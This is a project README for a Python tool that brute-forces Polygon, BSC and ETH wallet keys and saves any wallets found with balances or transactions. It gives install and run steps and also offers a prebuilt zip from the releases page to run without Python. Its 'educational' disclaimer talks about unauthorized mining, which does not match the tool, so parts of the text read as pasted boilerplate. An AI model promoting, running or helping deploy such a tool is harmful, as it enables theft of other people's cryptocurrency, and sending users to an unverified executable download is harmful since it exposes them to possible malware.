# Polygon Finder

 # tool for brute forcing matic crypto wallets

## **Disclaimer**

This script is developed for educational and research purposes only.

**By using this code, you agree to the following:**

1. You will not use this code, in whole or in part, for malicious intent, including but not limited to unauthorized mining on third-party systems.
2. You will seek explicit permission from any and all system owners before running or deploying this code.
3. You understand the implications of running mining software on hardware, including the potential for increased wear and power consumption.
4. The creator of this script cannot and will not be held responsible for any damages, repercussions, or any negative outcomes that result from using this script.

If you do not agree to these terms, please do not use or distribute this code.

# **Requirements**

**Here are the requirements that needs to be available before starting.**

1. Very good internet connection and device (4/8GB RAM)
2. Python Program available/insalled on machine
![image](https://github.com/hackerpro03/Polygon-Wallet-Finder/assets/99251253/270da557-19f9-48b8-a3d7-9912f9a55c8c)


# **Getting Started**

All you need is very good internet connection and few python libraries to be installed at the running device.

Follow the below steps one by one if you are starting from scratch. For already experienced people, you know it. Just skip few steps and have a short glace at it.

**Let's go.........**

1. **Install Python from official link** (make sure to use latest version)
```
https://www.python.org/
```

2. After installation of python, clone the **crypto-wallet-bruteforce** using: 
```
git clone https://github.com/hackerpro03/Polygon-Wallet-Finder
```

```
pip install requests
```
```
pip install hdwallet
```

Alright, initial setup process is completed. Now, we are ready to run the script.

# Execution

To run this script on this version, run crypto-wallet-bruteforce from the command line:
```
cd Polygon-Wallet-Finder
```
`Make sure you are on right path. Then type:`
```
python matic-attack.py
```
Or you can run it without python: https://github.com/hackerpro03/Polygon-Wallet-Finder/releases/download/matic/matic-scanner.zip

Now, the script will start to run and will display the updates on the screen.

# How to open the discovered wallet?

## Check Successful Wallets

### Wallets having Balance

Navigate to `Polygon-Wallet-Finder\hasBalance\` folder. There you can see all the wallets details which has amount on it. 

### Wallets having Transaction(s)

Navigate to `Polygon-Wallet-Finder\hasTransaction\` folder. There you can see all the wallets details which has transaction(s) on it. 

## Limitations

1. API Keys are available on free and pro so, based on it, it depends upon how many scripts you want to run for this bruteforce process.
2. For now, bsc, eth and matic is only supported. For other crypto currencies network, will update later on.
3. It is the initial version of the script so, somewhere there might be missing or issue. If you are interested to contribute, we are open and really appreciated.

# Contribution

Feel free to open an issue if you find a problem, or a pull request if you've solved an issue. And also any help in testing, development, documentation and other tasks is highly appreciated and useful to the project.

## Thank Note

Thanks to **https://github.com/meherett/python-hdwallet** for the awesome python library you have created.

`Star and watch the repo for updates, and your support is greatly appreciated!`
